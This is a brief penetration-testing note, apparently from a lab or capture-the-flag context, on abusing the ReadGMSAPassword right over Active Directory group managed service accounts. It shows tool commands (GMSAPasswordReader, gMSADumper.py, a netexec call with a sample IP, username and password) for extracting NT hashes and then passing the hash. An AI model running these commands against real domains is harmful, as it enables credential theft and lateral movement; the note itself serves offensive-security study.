### What are?
gMSA (Group Managed Service Account)

### What are they used for?
gMSA is a special type of service account in AD that provides automatic password management and simplified service principal management for multiple servers.

### Example:
A gMSA might be used for a service account running on multiple web servers in a farm, allowing them to securely share the same credentials without manual password updates.

## How to attack?
If you see in bloodhound that your account/pc(that you have access) can ReadGMSAPassword of another AD Object like a computer then you can do...

1)Upload to the attack carrier (**WINDOWS FRIELDLY**)
https://github.com/rvazarkar/GMSAPasswordReader
2)Run this to read the NTLM hash:
```
gmsapasswordreader.exe --accountname "VICTIMUSER"
```
3)You will get 2 different NT hashes, one old and one new, one of them must work! Then use it with PTH(aka PassTheHash).

**Linux Firendly**
```
gMSADumper.py -u 'user' -p 'password' -d 'domain.local'

//OR via Netexec
netexec ldap 10.129.80.58 -u marcos -p 'Coglione1!' --gmsa
```
(Required the credentials or hash!)
